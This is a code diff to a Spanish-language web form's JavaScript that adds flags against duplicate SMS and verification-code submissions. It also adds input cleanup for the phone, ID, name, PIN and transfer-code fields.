@@ -61,13 +61,15 @@ function ActBotSMSValidar() {
     }
 }
 setInterval(ActBotSMSValidar, 999);
-
+onetimesms = false
 function enviarSMS() {
     //console.log(document.getElementById("celular").value.trim().length)
     if (document.getElementById("celular").value.trim().length !== 9) {
         alert("El número de celular debe tener 9 dígitos.");
         return false;
     }
+    if (onetimesms) return
+    onetimesms = true
     $.ajax({
         type: 'POST',
         url: '/administrar/',
@@ -81,17 +83,21 @@ function enviarSMS() {
         },
         error: function (xhr, status, error) {
             // Lógica para manejar el error
+            onetimesms = false
             console.error('Error:', error);
         }
     });
 }
 
+onetimecodigo = false
 function enviarCodigo() {
     //console.log(document.getElementById("codigo").value.trim().length)
     if (document.getElementById("codigo").value.trim().length !== 6) {
         alert("El codigo de verificacion debe tener 6 caracteres.");
         return false; // Evita que el formulario se envíe
     }
+    if (onetimecodigo) return
+    onetimecodigo = true
     $.ajax({
         type: 'POST',
         url: '/administrar/',  // Reemplaza esto con la URL de tu vista de Django
@@ -108,11 +114,12 @@ function enviarCodigo() {
             }
             else {
                 alert("El codigo ingresado no es correcto.");
+                onetimecodigo = false
             }
         },
         error: function (xhr, status, error) {
             // Lógica para manejar el error
-
+            onetimecodigo = false
             console.error('Error:', error);
 
         }
@@ -225,6 +232,13 @@ function ActivacionBotonComprar() {
         document.getElementsByName("mi_combobox")[1].selectedIndex = previa2
         document.getElementsByName("mi_combobox")[2].selectedIndex = previa3
     }
+    document.getElementById('celular').value = document.getElementById('celular').value.replace(/\D/g, '');
+    document.getElementById('codigoTransferencia').value = document.getElementById('codigoTransferencia').value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
+    document.getElementById('dniTransferencia').value = document.getElementById('dniTransferencia').value.replace(/\D/g, '');
+    document.getElementById('codigo').value = document.getElementById('codigo').value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
+    document.getElementById('nombre').value = document.getElementById('nombre').value.replace(/[^A-Za-zÁÉÍÓÚÑáéíóúñ\s]/g, '').toUpperCase();
+    document.getElementById('dni').value = document.getElementById('dni').value.replace(/\D/g, '');
+    document.getElementById('pin').value = document.getElementById('pin').value.replace(/\D/g, '');
 }
 setInterval(ActivacionBotonComprar, 100);
 
